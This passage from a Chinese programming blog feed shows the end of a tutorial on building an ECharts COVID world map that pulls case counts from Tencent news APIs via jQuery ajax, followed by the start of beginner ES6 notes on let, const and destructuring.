<span class="string">"Togo"</span>: <span class="string">"多哥"</span>,</span><br><span class="line">    <span class="string">"China"</span>: <span class="string">"中国"</span>,</span><br><span class="line">    <span class="string">"Heard I. and McDonald Is."</span>: <span class="string">"赫德岛和麦克唐纳群岛"</span>,</span><br><span class="line">    <span class="string">"Armenia"</span>: <span class="string">"亚美尼亚"</span>,</span><br><span class="line">    <span class="string">"Falkland Is."</span>: <span class="string">"马尔维纳斯群岛（福克兰）"</span>,</span><br><span class="line">    <span class="string">"Ukraine"</span>: <span class="string">"乌克兰"</span>,</span><br><span class="line">    <span class="string">"Ghana"</span>: <span class="string">"加纳"</span>,</span><br><span class="line">    <span class="string">"Tonga"</span>: <span class="string">"汤加"</span>,</span><br><span class="line">    <span class="string">"Finland"</span>: <span class="string">"芬兰"</span>,</span><br><span class="line">    <span class="string">"Libya"</span>: <span class="string">"利比亚"</span>,</span><br><span class="line">    <span class="string">"Dominican Rep."</span>: <span class="string">"多米尼加"</span>,</span><br><span class="line">    <span class="string">"Indonesia"</span>: <span class="string">"印度尼西亚"</span>,</span><br><span class="line">    <span class="string">"Mauritius"</span>: <span class="string">"毛里求斯"</span>,</span><br><span class="line">    <span class="string">"Eq. Guinea"</span>: <span class="string">"赤道几内亚"</span>,</span><br><span class="line">    <span class="string">"Sweden"</span>: <span class="string">"瑞典"</span>,</span><br><span class="line">    <span class="string">"Vietnam"</span>: <span class="string">"越南"</span>,</span><br><span class="line">    <span class="string">"Mali"</span>: <span class="string">"马里"</span>,</span><br><span class="line">    <span class="string">"Russia"</span>: <span class="string">"俄罗斯"</span>,</span><br><span class="line">    <span class="string">"Bulgaria"</span>: <span class="string">"保加利亚"</span>,</span><br><span class="line">    <span class="string">"United States"</span>: <span class="string">"美国"</span>,</span><br><span class="line">    <span class="string">"Romania"</span>: <span class="string">"罗马尼亚"</span>,</span><br><span class="line">    <span class="string">"Angola"</span>: <span class="string">"安哥拉"</span>,</span><br><span class="line">    <span class="string">"Chad"</span>: <span class="string">"乍得"</span>,</span><br><span class="line">    <span class="string">"South Africa"</span>: <span class="string">"南非"</span>,</span><br><span class="line">    <span class="string">"Fiji"</span>: <span class="string">"斐济"</span>,</span><br><span class="line">    <span class="string">"Liechtenstein"</span>: <span class="string">"列支敦士登"</span>,</span><br><span class="line">    <span class="string">"Malaysia"</span>: <span class="string">"马来西亚"</span>,</span><br><span class="line">    <span class="string">"Austria"</span>: <span class="string">"奥地利"</span>,</span><br><span class="line">    <span class="string">"Mozambique"</span>: <span class="string">"莫桑比克"</span>,</span><br><span class="line">    <span class="string">"Uganda"</span>: <span class="string">"乌干达"</span>,</span><br><span class="line">    <span class="string">"Japan"</span>: <span class="string">"日本本土"</span>,</span><br><span class="line">    <span class="string">"Niger"</span>: <span class="string">"尼日尔"</span>,</span><br><span class="line">    <span class="string">"Brazil"</span>: <span class="string">"巴西"</span>,</span><br><span class="line">    <span class="string">"Kuwait"</span>: <span class="string">"科威特"</span>,</span><br><span class="line">    <span class="string">"Panama"</span>: <span class="string">"巴拿马"</span>,</span><br><span class="line">    <span class="string">"Guyana"</span>: <span class="string">"圭亚那"</span>,</span><br><span class="line">    <span class="string">"Madagascar"</span>: <span class="string">"马达加斯加"</span>,</span><br><span class="line">    <span class="string">"Luxembourg"</span>: <span class="string">"卢森堡"</span>,</span><br><span class="line">    <span class="string">"American Samoa"</span>: <span class="string">"美属萨摩亚"</span>,</span><br><span class="line">    <span class="string">"Andorra"</span>: <span class="string">"安道尔"</span>,</span><br><span class="line">    <span class="string">"Ireland"</span>: <span class="string">"爱尔兰"</span>,</span><br><span class="line">    <span class="string">"Italy"</span>: <span class="string">"意大利"</span>,</span><br><span class="line">    <span class="string">"Nigeria"</span>: <span class="string">"尼日利亚"</span>,</span><br><span class="line">    <span class="string">"Turks and Caicos Is."</span>: <span class="string">"特克斯和凯科斯群岛"</span>,</span><br><span class="line">    <span class="string">"Ecuador"</span>: <span class="string">"厄瓜多尔"</span>,</span><br><span class="line">    <span class="string">"U.S. Virgin Is."</span>: <span class="string">"美属维尔京群岛"</span>,</span><br><span class="line">    <span class="string">"Brunei"</span>: <span class="string">"文莱"</span>,</span><br><span class="line">    <span class="string">"Australia"</span>: <span class="string">"澳大利亚"</span>,</span><br><span class="line">    <span class="string">"Iran"</span>: <span class="string">"伊朗"</span>,</span><br><span class="line">    <span class="string">"Algeria"</span>: <span class="string">"阿尔及利亚"</span>,</span><br><span class="line">    <span class="string">"El Salvador"</span>: <span class="string">"萨尔瓦多"</span>,</span><br><span class="line">    <span class="string">"C?te d'Ivoire"</span>: <span class="string">"科特迪瓦"</span>,</span><br><span class="line">    <span class="string">"Chile"</span>: <span class="string">"智利"</span>,</span><br><span class="line">    <span class="string">"Puerto Rico"</span>: <span class="string">"波多黎各"</span>,</span><br><span class="line">    <span class="string">"Belgium"</span>: <span class="string">"比利时"</span>,</span><br><span class="line">    <span class="string">"Thailand"</span>: <span class="string">"泰国"</span>,</span><br><span class="line">    <span class="string">"Haiti"</span>: <span class="string">"海地"</span>,</span><br><span class="line">    <span class="string">"Iraq"</span>: <span class="string">"伊拉克"</span>,</span><br><span class="line">    <span class="string">"S?o Tomé and Principe"</span>: <span class="string">"圣多美和普林西比"</span>,</span><br><span class="line">    <span class="string">"Sierra Leone"</span>: <span class="string">"塞拉利昂"</span>,</span><br><span class="line">    <span class="string">"Georgia"</span>: <span class="string">"格鲁吉亚"</span>,</span><br><span class="line">    <span class="string">"Denmark"</span>: <span class="string">"丹麦"</span>,</span><br><span class="line">    <span class="string">"Philippines"</span>: <span class="string">"菲律宾"</span>,</span><br><span class="line">    <span class="string">"S. Geo. and S. Sandw. Is."</span>: <span class="string">"南乔治亚岛和南桑威奇群岛"</span>,</span><br><span class="line">    <span class="string">"Moldova"</span>: <span class="string">"摩尔多瓦"</span>,</span><br><span class="line">    <span class="string">"Morocco"</span>: <span class="string">"摩洛哥"</span>,</span><br><span class="line">    <span class="string">"Namibia"</span>: <span class="string">"纳米比亚"</span>,</span><br><span class="line">    <span class="string">"Malta"</span>: <span class="string">"马耳他"</span>,</span><br><span class="line">    <span class="string">"Guinea-Bissau"</span>: <span class="string">"几内亚比绍"</span>,</span><br><span class="line">    <span class="string">"Kiribati"</span>: <span class="string">"基里巴斯"</span>,</span><br><span class="line">    <span class="string">"Switzerland"</span>: <span class="string">"瑞士"</span>,</span><br><span class="line">    <span class="string">"Grenada"</span>: <span class="string">"格林纳达"</span>,</span><br><span class="line">    <span class="string">"Seychelles"</span>: <span class="string">"塞舌尔"</span>,</span><br><span class="line">    <span class="string">"Portugal"</span>: <span class="string">"葡萄牙"</span>,</span><br><span class="line">    <span class="string">"Estonia"</span>: <span class="string">"爱沙尼亚"</span>,</span><br><span class="line">    <span class="string">"Uruguay"</span>: <span class="string">"乌拉圭"</span>,</span><br><span class="line">    <span class="string">"Antigua and Barb."</span>: <span class="string">"安提瓜和巴布达"</span>,</span><br><span class="line">    <span class="string">"Lebanon"</span>: <span class="string">"黎巴嫩"</span>,</span><br><span class="line">    <span class="string">"Uzbekistan"</span>: <span class="string">"乌兹别克斯坦"</span>,</span><br><span class="line">    <span class="string">"Tunisia"</span>: <span class="string">"突尼斯"</span>,</span><br><span class="line">    <span class="string">"Djibouti"</span>: <span class="string">"吉布提"</span>,</span><br><span class="line">    <span class="string">"Greenland"</span>: <span class="string">"丹麦"</span>,</span><br><span class="line">    <span class="string">"Timor-Leste"</span>: <span class="string">"东帝汶"</span>,</span><br><span class="line">    <span class="string">"Dominica"</span>: <span class="string">"多米尼克"</span>,</span><br><span class="line">    <span class="string">"Colombia"</span>: <span class="string">"哥伦比亚"</span>,</span><br><span class="line">    <span class="string">"Burundi"</span>: <span class="string">"布隆迪"</span>,</span><br><span class="line">    <span class="string">"Bosnia and Herz."</span>: <span class="string">"波斯尼亚和黑塞哥维那"</span>,</span><br><span class="line">    <span class="string">"Cyprus"</span>: <span class="string">"塞浦路斯"</span>,</span><br><span class="line">    <span class="string">"Barbados"</span>: <span class="string">"巴巴多斯"</span>,</span><br><span class="line">    <span class="string">"Qatar"</span>: <span class="string">"卡塔尔"</span>,</span><br><span class="line">    <span class="string">"Palau"</span>: <span class="string">"帕劳"</span>,</span><br><span class="line">    <span class="string">"Bhutan"</span>: <span class="string">"不丹"</span>,</span><br><span class="line">    <span class="string">"Sudan"</span>: <span class="string">"苏丹"</span>,</span><br><span class="line">    <span class="string">"Nepal"</span>: <span class="string">"尼泊尔"</span>,</span><br><span class="line">    <span class="string">"Micronesia"</span>: <span class="string">"密克罗尼西亚"</span>,</span><br><span class="line">    <span class="string">"Bermuda"</span>: <span class="string">"百慕大"</span>,</span><br><span class="line">    <span class="string">"Suriname"</span>: <span class="string">"苏里南"</span>,</span><br><span class="line">    <span class="string">"Venezuela"</span>: <span class="string">"委内瑞拉"</span>,</span><br><span class="line">    <span class="string">"Israel"</span>: <span class="string">"以色列"</span>,</span><br><span class="line">    <span class="string">"St. Pierre and Miquelon"</span>: <span class="string">"圣皮埃尔和密克隆群岛"</span>,</span><br><span class="line">    <span class="string">"Central African Rep."</span>: <span class="string">"中非"</span>,</span><br><span class="line">    <span class="string">"Iceland"</span>: <span class="string">"冰岛"</span>,</span><br><span class="line">    <span class="string">"Zambia"</span>: <span class="string">"赞比亚"</span>,</span><br><span class="line">    <span class="string">"Senegal"</span>: <span class="string">"塞内加尔"</span>,</span><br><span class="line">    <span class="string">"Papua New Guinea"</span>: <span class="string">"巴布亚新几内亚"</span>,</span><br><span class="line">    <span class="string">"Trinidad and Tobago"</span>: <span class="string">"特立尼达和多巴哥"</span>,</span><br><span class="line">    <span class="string">"Zimbabwe"</span>: <span class="string">"津巴布韦"</span>,</span><br><span class="line">    <span class="string">"Jordan"</span>: <span class="string">"约旦"</span>,</span><br><span class="line">    <span class="string">"Gambia"</span>: <span class="string">"冈比亚"</span>,</span><br><span class="line">    <span class="string">"Kazakhstan"</span>: <span class="string">"哈萨克斯坦"</span>,</span><br><span class="line">    <span class="string">"Poland"</span>: <span class="string">"波兰"</span>,</span><br><span class="line">    <span class="string">"Eritrea"</span>: <span class="string">"厄立特里亚"</span>,</span><br><span class="line">    <span class="string">"Kyrgyzstan"</span>: <span class="string">"吉尔吉斯斯坦"</span>,</span><br><span class="line">    <span class="string">"Montserrat"</span>: <span class="string">"蒙特塞拉特"</span>,</span><br><span class="line">    <span class="string">"New Caledonia"</span>: <span class="string">"新喀里多尼亚"</span>,</span><br><span class="line">    <span class="string">"Macedonia"</span>: <span class="string">"马其顿"</span>,</span><br><span class="line">    <span class="string">"Paraguay"</span>: <span class="string">"巴拉圭"</span>,</span><br><span class="line">    <span class="string">"Latvia"</span>: <span class="string">"拉脱维亚"</span>,</span><br><span class="line">    <span class="string">"Hungary"</span>: <span class="string">"匈牙利"</span>,</span><br><span class="line">    <span class="string">"Syria"</span>: <span class="string">"叙利亚"</span>,</span><br><span class="line">    <span class="string">"Honduras"</span>: <span class="string">"洪都拉斯"</span>,</span><br><span class="line">    <span class="string">"Myanmar"</span>: <span class="string">"缅甸"</span>,</span><br><span class="line">    <span class="string">"Mexico"</span>: <span class="string">"墨西哥"</span>,</span><br><span class="line">    <span class="string">"Egypt"</span>: <span class="string">"埃及"</span>,</span><br><span class="line">    <span class="string">"Nicaragua"</span>: <span class="string">"尼加拉瓜"</span>,</span><br><span class="line">    <span class="string">"Cuba"</span>: <span class="string">"古巴"</span>,</span><br><span class="line">    <span class="string">"Serbia"</span>: <span class="string">"塞尔维亚"</span>,</span><br><span class="line">    <span class="string">"Comoros"</span>: <span class="string">"科摩罗"</span>,</span><br><span class="line">    <span class="string">"United Kingdom"</span>: <span class="string">"英国"</span>,</span><br><span class="line">    <span class="string">"Fr. S. Antarctic Lands"</span>: <span class="string">"南极洲"</span>,</span><br><span class="line">    <span class="string">"Congo"</span>: <span class="string">"刚果（布）"</span>,</span><br><span class="line">    <span class="string">"Greece"</span>: <span class="string">"希腊"</span>,</span><br><span class="line">    <span class="string">"Sri Lanka"</span>: <span class="string">"斯里兰卡"</span>,</span><br><span class="line">    <span class="string">"Croatia"</span>: <span class="string">"克罗地亚"</span>,</span><br><span class="line">    <span class="string">"Botswana"</span>: <span class="string">"博茨瓦纳"</span>,</span><br><span class="line">    <span class="string">"Siachen Glacier"</span>: <span class="string">"锡亚琴冰川地区"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用地图样式前记得在html页面的index.js前引入world.js文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/world.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里，腾讯的全球数据是海外的，是的没错，就是海外的，不包括中国，我可差点没被气死（想了想，人家腾讯已经算好给你数据接口了，气啥），所以我需要再ajax一下，获取腾讯的国内数据，然后加到世界地图上去，所以这里就用到了两个ajax了，反正都差不多，代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> virus = []</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">        dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> res = data.data || <span class="string">""</span>;</span><br><span class="line">            res = <span class="built_in">JSON</span>.parse(res).chinaTotal.confirm;</span><br><span class="line">            virus.push(&#123; <span class="attr">name</span>: <span class="string">'中国'</span>, <span class="attr">value</span>: res &#125;)</span><br><span class="line">            myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">                series: [&#123;</span><br><span class="line">                    <span class="comment">// 根据名字对应到相应的系列</span></span><br><span class="line">                    data: virus</span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'https://api.inews.qq.com/newsqa/v1/automation/foreign/country/ranklist'</span>,</span><br><span class="line">        type: <span class="string">'get'</span>,</span><br><span class="line">        <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> num = data.data</span><br><span class="line">            <span class="keyword">var</span> sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num.length; i++) &#123;</span><br><span class="line">                virus.push(&#123; <span class="attr">name</span>: num[i].name, <span class="attr">value</span>: num[i].confirm &#125;)</span><br><span class="line">                sum += num[i].confirm</span><br><span class="line">            &#125;</span><br><span class="line">            myChart.setOption(&#123; <span class="comment">//加载数据图表</span></span><br><span class="line">                series: [&#123;</span><br><span class="line">                    <span class="comment">// 根据名字对应到相应的系列</span></span><br><span class="line">                    data: virus</span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    setInterval(ajax, <span class="number">3600000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br><span class="line">&#125;</span><br><span class="line">ajax()</span><br></pre></td></tr></table></figure><p>至此，图表的数据就好了，还没呢还没呢，还有全球确诊和全球治愈呢，好滴好滴</p><h2 id="全球确诊，全球治愈"><a href="#全球确诊，全球治愈" class="headerlink" title="全球确诊，全球治愈"></a>全球确诊，全球治愈</h2><p>这里就只需要获取海外的疫情状况然后加上从中国获取到的数据就ok啦，（这里代码嵌套了，后面应该把代码优化下弄成promise版本的），然后就显示到li标签上啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5'</span>,</span><br><span class="line">    type: <span class="string">'get'</span>,</span><br><span class="line">    <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">    dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> res = data.data || <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// console.log(JSON.parse(res).chinaTotal.heal)</span></span><br><span class="line">        <span class="keyword">var</span> res1 = <span class="built_in">JSON</span>.parse(res).chinaTotal.confirm;</span><br><span class="line">        <span class="keyword">var</span> res2 = <span class="built_in">JSON</span>.parse(res).chinaTotal.heal;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">'https://api.inews.qq.com/newsqa/v1/automation/modules/list?modules=FAutoGlobalStatis,FAutoContinentStatis,FAutoGlobalDailyList,FAutoCountryConfirmAdd'</span>,</span><br><span class="line">            type: <span class="string">'get'</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&#125;,</span></span><br><span class="line">            dataType: <span class="string">'json'</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// console.log(data)</span></span><br><span class="line">                <span class="keyword">var</span> sum = data.data.FAutoGlobalStatis.confirm + res1</span><br><span class="line">                <span class="keyword">var</span> cureSum = data.data.FAutoGlobalStatis.heal + res2</span><br><span class="line">                $(<span class="string">".no-hd li:first"</span>).text(sum)</span><br><span class="line">                $(<span class="string">".no-hd li:nth-child(2)"</span>).text(cureSum)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>到这里，就做完这个小项目啦，如下图（颜色搭配可以上Echarts参考修改下），也可以点击<a href="https://ypigy.gitee.io/te/" target="_blank" rel="noopener">这里</a>看我的在线成果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%85%A8%E7%90%83%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE/image-20200720110701504.png" alt="image-20200720110701504"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次制作这个疫情地图花费的时间如果不算上出去玩啥的，总共花了大概一天半吧，主要在数据获取分析这里花费好多时间，特别是从一个数据源获取后在线无法显示，之后换成腾讯数据源时的数据处理上，花费了大量时间，不过也好，学了不同数据源的不同数据处理方法，累并快乐着，至少在欣赏自己做出的疫情地图后，无比欣慰。反正不懂得问题我就先自己琢磨解决，自己解决了成就感也会随之而来，实在不行就去百度也可，然后做完这个真的像是在复习好多内容，前面学的html、css都在此有所复习起来吧，特别是js，很多基础知识点都抓回来了，之前学的时候懵懵，不知道用处是啥，单纯数学计算，现在就用到这些来处理数据了，慢慢（满满）收获吧。也相当于复习吧，没多少新知识点。这个八月的小项目也算提前完成了，耶✌。</p>]]></content>
      
      
      <categories>
          
          <category> Echarts </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Echarts </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6初步学习笔记</title>
      <link href="/2020/07/18/ES6%E5%88%9D%E8%AF%86/"/>
      <url>/2020/07/18/ES6%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>指导书籍：ES6入门教程</p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol><li><p>ECMAScript 6.0是 JavaScript 语言的下一代标准</p><ul><li>Ecmascript 是 JavaScript 语言的标注规范</li><li>JavaScript 是 Ecmascript 规范的具体实现</li></ul></li><li><p><a href="https://ypigy.gitee.io/2020/07/28/babel%E8%BD%AC%E7%A0%81%E5%99%A8/" target="_blank" rel="noopener">Babel转码器</a>（后面会讲到）</p><p>Babel是一个广泛使用的 ES6 转码器，可以将 ES6 代码转为 ES5 代码，从而在老版本的浏览器执行。</p></li></ol><h1 id="let命令"><a href="#let命令" class="headerlink" title="let命令"></a>let命令</h1><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p>let命令类似于var，但是它遵守块级作用域（一般在局部作用域中，var声明的变量在外部是可以访问的到的）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a)  <span class="comment">//1</span></span><br><span class="line"><span class="built_in">console</span>.log(b) <span class="comment">//b is not defined</span></span><br></pre></td></tr></table></figure><p>a会正常输出，b会报错，即表明let只在块级作用域才会有效（for循环便可使用该命令防止命名污染）</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>防止内层变量覆盖外层变量</li><li>防止计数的循环变量泄露为全局变量（for循环以及其它循环）</li></ul><h2 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h2><ul><li><p><code>var</code>命令会发生“变量提升”现象，即变量可以在声明之前使用，值为<code>undefined</code>。</p></li><li><p><code>let</code>命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。</p></li></ul><h2 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    a = <span class="number">3</span></span><br><span class="line">    <span class="keyword">let</span> a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，已经在全局变量中声明了一个<code>a</code>，同时在块级作用域内为其赋值，但是因为在块级作用域中同时又声明了一个<code>let</code>命令的<code>a</code>,所以就产生了暂时性死区，这时对<code>a</code>的赋值就会报错</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>在代码块内，使用<code>let</code>命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”（temporal dead zone，简称 TDZ）</li><li>如果区块中存在<code>let</code>和<code>const</code>命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错</li><li>暂时性死区的本质就是，只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量。</li></ul><h2 id="不允许重复声明"><a href="#不允许重复声明" class="headerlink" title="不允许重复声明"></a>不允许重复声明</h2><p>let在块级作用域内不允许重复声明同一个变量</p><h1 id="const"><a href="#const" class="headerlink" title="const"></a>const</h1><ul><li>声明一个常量。一旦声明，常量的值就不能改变</li><li>其它特性同let一致</li></ul><p>注意：</p><blockquote><p><code>const</code>实际上保证的，并不是变量的值不得改动，而是变量指向的那个<strong>内存地址</strong>所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，<code>const</code>只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个<strong>对象</strong>声明为常量必须非常小心。</p></blockquote><h1 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值"></a>变量的解构赋值</h1><h2 id="数组的解构赋值"><a href="#数组的解构赋值" class="headerlink" title="数组的解构赋值"></a>数组的解构赋值</h2><blockquote><p>ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, ...b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">a <span class="comment">// 1</span></span><br><span class="line">b <span class="comment">// [2, 3, 4]</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, , c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment">//a:1, c:3</span></span><br></pre></td></tr></table></figure><p>解构不成功的值就等于<code>undefined</code></p><p>解构赋值允许指定默认值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a = <span class="number">1</span>] = []; <span class="comment">//a:1</span></span><br></pre></td></tr></table></figure><blockquote><p>注意，ES6 内部使用严格相等运算符（<code>===</code>），判断一个位置是否有值。所以，只有当一个数组成员严格等于<code>undefined</code>，默认值才会生效。</p></blockquote><p>如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x = f()] = [<span class="number">1</span>]</span><br><span class="line"><span class="comment">//x:1</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>惰性求值</strong>：表达式不在它被绑定到变量之后就立即求值，而是在该值被取用的时候求值</p></blockquote><h2 id="对象的解构赋值"><a href="#对象的解构赋值" class="headerlink" title="对象的解构赋值"></a>对象的解构赋值</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; a, b &#125; = &#123; <span class="attr">a</span>: <span class="string">'aaa'</span>, <span class="attr">b</span>: <span class="string">'bbb'</span> &#125;;</span><br><span class="line"><span class="comment">//a:aaa, b:bbb</span></span><br></pre></td></tr></table></figure><p>字符串、数值以及布尔值的解构赋值比较少用，这里没列出来，以后用到会学</p><h2 id="函数参数的解构赋值"><a href="#函数参数的解构赋值" class="headerlink" title="函数参数的解构赋值"></a>函数参数的解构赋值</h2><p>函数的参数同样可以使用解构赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">[x, y]</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add([<span class="number">1</span>, <span class="number">2</span>]); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h1 id="字符串新增方法"><a href="#字符串新增方法" class="headerlink" title="字符串新增方法"></a>字符串新增方法</h1><h2 id="实例方法：includes-startsWith-endsWith"><a 